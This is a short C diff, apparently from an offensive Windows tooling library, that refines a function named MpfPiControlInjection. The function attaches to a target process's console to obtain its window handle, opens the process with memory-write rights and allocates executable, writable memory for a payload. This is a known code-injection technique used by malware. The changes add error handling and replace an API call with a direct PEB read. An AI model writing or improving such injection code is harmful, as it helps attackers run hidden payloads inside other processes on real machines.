@@ -17,7 +17,7 @@ BOOL MpfPiControlInjection(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _I
 	HANDLE hHandle = NULL;
 	LPVOID BaseAddress = NULL;
 	INPUT Input = { 0 };
-	BOOL bFlag = FALSE;				
+	BOOL bFlag = FALSE;			
 
 	hNtdll = GetModuleHandleEx2W(L"ntdll.dll");
 	hKernelbase = GetModuleHandleEx2W(L"kernelbase.dll");
@@ -47,20 +47,30 @@ BOOL MpfPiControlInjection(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _I
 	if (GetConsoleProcessList(ConsoleAttachList, 2) < 2)
 		goto EXIT_ROUTINE;
 
-	if (ConsoleAttachList[0] != GetCurrentProcessIdFromTeb())
+	if (ConsoleAttachList[0] != GetCurrentProcessId())
 		ParentId = ConsoleAttachList[0];
 	else
 		ParentId = ConsoleAttachList[1];
 
-	FreeConsole();
-	AttachConsole(TargetProcessId);
+	if (!FreeConsole())
+		goto EXIT_ROUTINE;
 
-	hWindow = GetConsoleWindow();
+	if (!AttachConsole(TargetProcessId))
+		goto EXIT_ROUTINE;
 
-	FreeConsole();
-	AttachConsole(ParentId);
+	hWindow = (HWND)GetPeb()->ProcessParameters->ConsoleHandle;
+	if (hWindow == NULL)
+		goto EXIT_ROUTINE;
+
+	if (!FreeConsole())
+		goto EXIT_ROUTINE;
+
+	if (!AttachConsole(ParentId))
+		goto EXIT_ROUTINE;
 
 	hHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, TargetProcessId);
+	if (hHandle == NULL)
+		goto EXIT_ROUTINE;
 
 	BaseAddress = VirtualAllocEx(hHandle, NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (BaseAddress == NULL)
